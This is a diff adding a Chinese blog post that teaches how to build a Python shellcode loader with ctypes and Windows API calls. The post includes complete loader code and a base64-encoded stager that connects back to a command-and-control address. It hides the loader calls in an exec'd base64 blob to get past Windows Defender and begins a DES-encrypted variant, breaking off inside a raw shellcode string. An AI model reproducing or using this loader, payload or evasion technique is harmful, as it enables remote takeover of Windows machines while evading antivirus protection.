@@ -1,0 +1,649 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>Shellcode加载器实现-Python - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Shellcode加载器实现-Python">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-18 18:18" pubdate>
+        2021年3月18日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      41
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Shellcode加载器实现-Python</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月19日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    突然想学学python是如何加载shellcode的。</p>
+<h1 id="2-代码"><a href="#2-代码" class="headerlink" title="2.代码"></a>2.代码</h1><p>​    利用ctypes库来调用windows api来完成加载shellcode的操作。</p>
+<h2 id="一些函数的详细信息："><a href="#一些函数的详细信息：" class="headerlink" title="一些函数的详细信息："></a><strong>一些函数的详细信息：</strong></h2><h3 id="1-RtlMoveMemory"><a href="#1-RtlMoveMemory" class="headerlink" title="1.RtlMoveMemory"></a>1.RtlMoveMemory</h3><p>​    调用RtlMoveMemory函数可以将shellcode载入内存，此函数从指定内存中复制内容至另一内存里。RtlMoveMemory函数原型和参数如下:</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">RtlMoveMemory(Destination,Source,<span class="hljs-built_in">Length</span>);<br>Destination ：指向移动目的地址的指针。<br>Source ：指向要复制的内存地址的指针。<br><span class="hljs-built_in">Length</span> ：指定要复制的字节数。<br></code></pre></td></tr></table></figure>
+<p>从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">buf = (ctypes.c_char<span class="hljs-operator"> * </span>len(shellcode)).from<span class="hljs-constructor">_buffer(<span class="hljs-params">shellcode</span>)</span><br>ctypes.windll.kernel32.<span class="hljs-constructor">RtlMoveMemory(<span class="hljs-params">ctypes</span>.<span class="hljs-params">c_int</span>(<span class="hljs-params">ptr</span>)</span>,<br>buf,                                     <br>ctypes.c<span class="hljs-constructor">_int(<span class="hljs-params">len</span>(<span class="hljs-params">shellcode</span>)</span>))<br></code></pre></td></tr></table></figure>
+<h3 id="2-CreateThread"><a href="#2-CreateThread" class="headerlink" title="2.CreateThread"></a>2.CreateThread</h3><p>​    创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread函数原型和参数如下：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">HANDLE</span> CreateThread(<br>LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="hljs-comment">#线程安全属性</span><br>SIZE_T dwStackSize,       <span class="hljs-comment">#置初始栈的大小，以字节为单位</span><br>LPTHREAD_START_ROUTINE lpStartAddress,  <span class="hljs-comment">#指向线程函数的指针</span><br>LPVOID lpParameter,          <span class="hljs-comment">#向线程函数传递的参数</span><br>DWORD dwCreationFlags,       <span class="hljs-comment">#线程创建属性</span><br>LPDWORD lpThreadId           <span class="hljs-comment">#保存新线程的id</span><br>)<br></code></pre></td></tr></table></figure>
+<p>创建一个线程从shellcode放置位置开始执行</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">handle</span> = ctypes.windll.kernel32.<span class="hljs-type">CreateThread</span>(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_uint64(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0))<br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>lpThreadAttributes</th>
+<th>为NULL使用默认安全性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dwStackSize</td>
+<td>为0，默认将使用与调用该函数的线程相同的栈空间大小</td>
+</tr>
+<tr>
+<td>lpStartAddress</td>
+<td>为ctypes.c_uint64(ptr)，定位到申请的内存所在的位置</td>
+</tr>
+<tr>
+<td>lpParameter</td>
+<td>不需传递参数时为NULL</td>
+</tr>
+<tr>
+<td>dwCreationFlags</td>
+<td>属性为0，表示创建后立即激活</td>
+</tr>
+<tr>
+<td>lpThreadId</td>
+<td>为ctypes.pointer(ctypes.c_int(0))不想返回线程ID,设置值为NULL</td>
+</tr>
+</tbody></table>
+<h3 id="3-WaitForSingleObject"><a href="#3-WaitForSingleObject" class="headerlink" title="3.WaitForSingleObject"></a>3.WaitForSingleObject</h3><p>​    等待线程结束调用WaitForSingleObject函数用来检测线程的状态WaitForSingleObject函数原型和参数如下：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">DWORD WINAPI <span class="hljs-keyword">WaitForSingleObject(</span><br><span class="hljs-keyword">__in </span>HANDLE hHandle,     <span class="hljs-comment">#对象句柄。可以指定一系列的对象</span><br>__in DWORD dwMilliseconds  <span class="hljs-comment">#定时时间间隔</span><br>);<br></code></pre></td></tr></table></figure>
+<p> 等待创建的线程运行结束</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.WaitForSingleObject</span>(                                          <br><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.c_int</span>(<span class="hljs-selector-tag">handle</span>),                                          <br><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.c_int</span>(<span class="hljs-selector-tag">-1</span>))<br></code></pre></td></tr></table></figure>
+<p>这里两个参数，一个是创建的线程，一个是等待时间</p>
+<blockquote>
+<p>当线程退出时会给出一个信号，函数收到后会结束程序。当时间设置为0或超过等待时间，程序也会结束，所以线程也会跟着结束。</p>
+</blockquote>
+<p>正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束。</p>
+<h3 id="4-VirtualAlloc"><a href="#4-VirtualAlloc" class="headerlink" title="4.VirtualAlloc"></a>4.VirtualAlloc</h3><p>申请内存调用VirtualAlloc函数，来申请一块动态内存区域。VirtualAlloc函数原型和参数如下：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">LPVOID</span> VirtualAlloc&#123;<br><span class="hljs-attribute">LPVOID</span> lpAddress, <span class="hljs-comment">#要分配的内存区域的地址</span><br>DWORD dwSize,      <span class="hljs-comment">#分配的大小</span><br>DWORD flAllocationType, <span class="hljs-comment">#分配的类型</span><br>DWORD flProtect     <span class="hljs-comment">#该内存的初始保护属性</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>申请一块内存可读可写可执行</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ptr = ctypes.windll.kernel32.<span class="hljs-constructor">VirtualAlloc(<span class="hljs-params">ctypes</span>.<span class="hljs-params">c_int</span>(0)</span>,<br>ctypes.c<span class="hljs-constructor">_int(<span class="hljs-params">len</span>(<span class="hljs-params">shellcode</span>)</span>), <br>ctypes.c<span class="hljs-constructor">_int(0x3000)</span>,                                       <br>ctypes.c<span class="hljs-constructor">_int(0x40)</span>)<br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>ctypes.c_int(0)</th>
+<th>是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ctypes.c_int(len(shellcode))</td>
+<td>以字节为单位分配或者保留多大区域</td>
+</tr>
+<tr>
+<td>ctypes.c_int(0x3000)</td>
+<td>是 MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)类型的合并</td>
+</tr>
+<tr>
+<td>ctypes.c_int(0x40)</td>
+<td>是权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域。</td>
+</tr>
+</tbody></table>
+<h3 id="5-完整测试代码"><a href="#5-完整测试代码" class="headerlink" title="5.完整测试代码"></a>5.完整测试代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> ctypes<br><br>VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc<br>RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory<br>CreateThread = ctypes.windll.kernel32.CreateThread<br>WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject<br><br><span class="hljs-comment">#shellcode可以用msf来生成</span><br>buf = <span class="hljs-string">b&quot;&quot;</span><br><br>shellcode = <span class="hljs-built_in">bytearray</span>(buf)<br>VirtualAlloc.restype = ctypes.c_void_p  <span class="hljs-comment"># 重载函数返回类型为void</span><br>p = VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x00000040</span>)  <span class="hljs-comment"># 申请内存</span><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)  <span class="hljs-comment"># 将shellcode指向指针</span><br>RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)))  <span class="hljs-comment"># 复制shellcode进申请的内存中</span><br>h = CreateThread(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_void_p(p), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))  <span class="hljs-comment"># 执行创建线程</span><br>WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-<span class="hljs-number">1</span>))  <span class="hljs-comment"># 检测线程创建事件</span><br></code></pre></td></tr></table></figure>
+<h3 id="6-使用以及效果"><a href="#6-使用以及效果" class="headerlink" title="6.使用以及效果"></a>6.使用以及效果</h3><p>先用msf生成shellcode：</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/1.png" srcset="/img/loading.gif"></p>
+<p>用Msf开启监听：</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/2.png" srcset="/img/loading.gif"></p>
+<p>在虚拟机里执行：</p>
+<p>成功反弹meterpreter的shell：</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/3.png" srcset="/img/loading.gif"></p>
+<p>可以使用pyinstaller来将其打包成exe。但是没有经过免杀的话，会被windows自带的防火墙给屏蔽警告。</p>
+<p>但是可以过了某个的安全防护软件。（自己猜）</p>
+<h1 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h1><p>​    以上的测试源码在用<code>pyinstaller</code>进行打包后，会触发windows defender的病毒和威胁的警报。</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/4.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/5.png" srcset="/img/loading.gif"></p>
+<p>因此我猜测是<code>VirtualAlloc</code>、<code>RtlMoveMemory</code>这些调用windows api的函数的问题。</p>
+<h2 id="1-利用base64编码"><a href="#1-利用base64编码" class="headerlink" title="1.利用base64编码"></a>1.利用base64编码</h2><p>​    可以利用base64编码，将shellcode和以上的猜测的函数进行编码，增加绕过机会：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> base64<br><br>shellcode_base64 = <span class="hljs-string">b&#x27;/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaFwRAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAADpyQEAAOhv////L1JHTXYA3qAHpSBKNsHm8ge1RJ7AVBNOKSJMJC68H9m5b4RhRoQc4twwMXO1MsHoVkpSyut1glsEWaHWsBRx4gEYTT9430WqkkoCu8BucgBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IE5QMDIpDQoAqyNDy5d/amytOgRpH1+GspqjvXg/hoXQ1/BDFHHGhfHKtFHIs5c+/NoL7UyaxupaniHaT426AYr8NQylmevvuMqxOuzfJyLCGv1KMwH5Msi6WWI1QqUHksEQcuw1ajm87RmDnZhax+K1vBJqYWw7UHMUg6CCguqwvuZBytiG/v1eg6E85lJxmneKPKavHuxwHjq3sLCyHpPcnJIB8q6FidqoLxv+0mqee8fP94Swg+300l+kIgdRgLyPJ2TTwRoUCWYxjdqyqKAB/UjQrlXjE+yh+JIAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zE5Mi4xNjguMTk5LjI0NgBvqlHD&#x27;</span><br>shellcode = <span class="hljs-built_in">bytearray</span>(base64.b64decode(shellcode_base64))<br><span class="hljs-comment"># VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="hljs-comment"># RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory</span><br><span class="hljs-comment"># CreateThread = ctypes.windll.kernel32.CreateThread</span><br><span class="hljs-comment"># WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="hljs-comment"># p = VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),0x3000,0x00000040)</span><br><span class="hljs-comment"># buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针</span><br><span class="hljs-comment"># RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(shellcode)))  # 复制shellcode进申请的内存中</span><br><span class="hljs-comment"># h = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))  # 执行创建线程</span><br><span class="hljs-comment"># WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1))  # 检测线程创建事件</span><br><br><br><span class="hljs-comment">##load 变量存的是以上注释参数的base64加密</span><br>load = <span class="hljs-string">b&#x27;ClZpcnR1YWxBbGxvYyA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jClJ0bE1vdmVNZW1vcnkgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkKQ3JlYXRlVGhyZWFkID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQKV2FpdEZvclNpbmdsZU9iamVjdCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdAoKVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY192b2lkX3AKcCA9IFZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwweDMwMDAsMHgwMDAwMDA0MCkKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKSAgClJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdm9pZF9wKHApLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpICAKaCA9IENyZWF0ZVRocmVhZChjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfdm9pZF9wKHApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSkgCldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGgpLCBjdHlwZXMuY19pbnQoLTEpKSAg&#x27;</span><br>exec(base64.b64decode(load))<br><br></code></pre></td></tr></table></figure>
+<p>生成后，没有再被检查出来了。</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/6.png" srcset="/img/loading.gif"></p>
+<p>成功上线！！！</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/7.png" srcset="/img/loading.gif"></p>
+<p>看起来很美好，但是上线之后就被windows defender给查出来了。</p>
+<p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/8.png" srcset="/img/loading.gif"></p>
+<p>估计是对CS的shellcode有解析识别了。。。。。。</p>
+<h2 id="2-利用DES加密"><a href="#2-利用DES加密" class="headerlink" title="2.利用DES加密"></a>2.利用DES加密</h2><p>同base64处理的结果，因此想要绕过<code>windows defender</code>的检查，需要对CS的shellcode进行处理。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Cryptodome.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 这是密钥</span><br>key = <span class="hljs-string">b&#x27;READERNB&#x27;</span>   <span class="hljs-comment"># key需为8字节长度.</span><br><span class="hljs-comment"># 需要去生成一个DES对象</span><br>des = DES.new(key, DES.MODE_ECB)<br><br><span class="hljs-comment">#shellcode 的解密过程</span><br><span class="hljs-comment"># buf = b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x5c\x11\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x